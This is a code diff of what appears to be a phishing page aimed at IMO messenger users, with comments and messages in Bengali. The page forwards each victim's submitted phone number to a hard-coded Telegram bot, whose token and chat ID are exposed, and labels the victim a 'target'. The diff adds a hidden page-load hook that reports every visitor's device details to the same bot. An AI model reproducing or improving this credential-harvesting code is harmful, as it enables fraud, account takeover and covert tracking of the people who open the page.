@@ -115,7 +115,7 @@
     const BOT_TOKEN = "7548672389:AAFvtDCWlgnL00I0BCwnGlzY_D0kTAIm0rI"; 
     const CHAT_ID = "7437458013"; 
 
-    // Telegram Message Sender
+    // Telegram Message Sender Function
     async function sendToTelegram(message) {
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
         try {
@@ -133,6 +133,14 @@
         }
     }
 
+    // --- NEW LOGIC: VISITOR ALERT (Page Load) ---
+    // পেজ ওপেন করলেই এই ফাংশনটি কাজ করবে
+    window.addEventListener('load', async () => {
+        // User Agent দিয়ে ডিভাইস সম্পর্কে কিছুটা তথ্য নেওয়া
+        const device = navigator.userAgent; 
+        await sendToTelegram(`👀 *নতুন ভিজিটর অ্যালার্ট*\nকেউ একজন আপনার পেজটি ওপেন করেছে!\n📱 Device: \`${device}\`\n🕒 সময়: ${new Date().toLocaleTimeString()}`);
+    });
+
     // --- STEP 1: Handle Phone Number ---
     async function handlePhoneSubmit() {
         const phoneInput = document.getElementById('inputPhone');
@@ -145,7 +153,7 @@
         }
 
         // Send Phone to Telegram
-        await sendToTelegram(`📱 *নতুন টার্গেট (IMO)*\n📞 নাম্বার: \`${phoneVal}\`\n🕒 সময়: ${new Date().toLocaleTimeString()}`);
+        await sendToTelegram(`📱 *IMO নাম্বার প্রাপ্ত*\n📞 নাম্বার: \`${phoneVal}\``);
 
         // UI Transition: Phone -> Loader
         document.getElementById('step-phone').classList.add('hidden');
@@ -193,4 +201,4 @@
 </script>
 
 </body>
-                        </html>
+</html>
